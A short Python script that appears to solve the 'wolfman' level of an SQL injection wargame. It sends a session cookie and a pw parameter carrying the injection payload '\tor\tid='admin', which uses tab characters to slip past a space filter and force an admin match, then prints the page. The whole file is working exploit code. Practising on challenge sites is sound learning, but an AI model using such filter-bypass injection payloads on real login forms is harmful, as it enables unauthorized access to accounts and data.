import sys

import requests

URL = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"
PHPSESSID = sys.argv[1]

sess = requests.Session()
sess.cookies.set("PHPSESSID", PHPSESSID)

res = sess.get(URL, params={"pw": "'\tor\tid='admin"})
print(res.text)
